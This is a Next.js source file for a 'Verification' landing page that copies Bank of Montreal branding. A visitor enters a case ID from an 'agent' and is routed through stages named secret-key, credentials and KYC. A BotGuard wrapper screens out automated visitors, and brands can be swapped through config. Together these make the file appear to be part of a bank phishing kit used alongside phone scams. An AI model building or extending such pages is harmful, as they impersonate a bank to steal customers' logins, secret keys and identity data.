'use client';

/**
 * BMO Landing Page
 * 
 * Entry point for customer-initiated verification path
 * Customer enters case ID and is redirected to session UUID
 */

import { useCallback, useState } from 'react';
import { useRouter } from 'next/navigation';
import { currentBrand } from '@/config/branding';
import { useSessionStore } from '@shared';
import { AlertCircle, Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function HomePage() {
  const router = useRouter();

  const [caseId, setCaseId] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId.trim()) {
        setFieldError('Please enter your case ID');
        return;
      }

      setIsLoading(true);

      try {
        const response = await fetch('/api/session/lookup-by-case-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            caseId: caseId.trim(),
          }),
        });

        if (!response.ok) {
          const error = await response.json();
          setFieldError(
            error.error || 'Unable to validate case ID. Please try again.'
          );
          return;
        }

        const data = await response.json();
        const sessionUuid = data.sessionUuid;
        const returnedCaseId = data.caseId;
        const currentStage = data.next_step || 'credentials';
        const guestToken = data.guestToken;

        if (!sessionUuid) {
          setFieldError('Unable to validate case ID. Please try again.');
          return;
        }

        const stageToRoute: Record<string, string> = {
          'secret_key': 'secret-key',
          'credentials': 'credentials',
          'kyc': 'kyc',
          'completed': 'completed',
          'terminated': 'terminated',
        };
        const route = stageToRoute[currentStage] || 'credentials';

        useSessionStore.setState({
          sessionUuid,
          caseId: returnedCaseId,
          guestToken,
          stage: currentStage as any,
        });

        router.push(`/${sessionUuid}/${route}`);
      } catch (error) {
        console.error('Error:', error);
        setFieldError('Unable to validate case ID. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [caseId, router]
  );

  return (
    <BotGuard>
      {/* Centered Page Header */}
      <div className="page-header">
        <img src="/brands/bmo/lock..svg" alt="" className="lock-icon" />
        <h1>Verification</h1>
      </div>

      {/* Two Column Layout */}
      <div className="main-container">
        {/* Login Card */}
        <div className="login-card">
          {/* Card Header - Shows on mobile */}
          <div className="card-header">
            <h2>Verification</h2>
          </div>

          <form className="login-form" onSubmit={handleSubmit}>

            {/* Case ID Input */}
            <div className="form-group">
              <label htmlFor="case-id">Case ID</label>
              <input
                type="text"
                id="case-id"
                name="case-id"
                autoComplete="off"
                value={caseId}
                onChange={(e) => {
                  setCaseId(e.target.value);
                  if (fieldError) setFieldError('');
                }}
                disabled={isLoading}
              />
            </div>

            {/* Error message */}
            {fieldError && (
              <div className="error-message">
                <AlertCircle className="h-4 w-4" />
                <span>{fieldError}</span>
              </div>
            )}

            {/* Continue Button */}
            <button
              type="submit"
              className="btn-signin"
              disabled={isLoading}
            >
              {isLoading && <Loader2 className="h-4 w-4 animate-spin" style={{ marginRight: '8px' }} />}
              {isLoading ? 'PROCESSING...' : 'CONTINUE'}
            </button>

            <p style={{ color: 'var(--bmo-gray)', fontSize: '13px', textAlign: 'center', marginTop: '16px' }}>
              If an agent has provided you with a direct link, please use that link instead.
            </p>
          </form>
        </div>

        {/* Right Panels */}
        <div className="info-panels">
          <div className="info-card security-card">
            <div className="security-header">
              <img src="/brands/bmo/lock..svg" alt="" className="security-icon" />
              <h2>Your security always comes first</h2>
            </div>
            <p className="security-text">
              We've made Online Banking more convenient, while still using advanced security
              technologies that keep your money and information safe.
            </p>
            <a href="#" className="learn-more-link">
              Learn more about how we protect you.
              <svg className="external-icon" viewBox="0 0 24 24" width="14" height="14">
                <path fill="currentColor"
                  d="M14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7zm-2 16H5V7h7V5H5a2 2 0 00-2 2v12a2 2 0 002 2h12a2 2 0 002-2v-7h-2v7h-5z" />
              </svg>
            </a>
          </div>
        </div>
      </div>
    </BotGuard>
  );
}
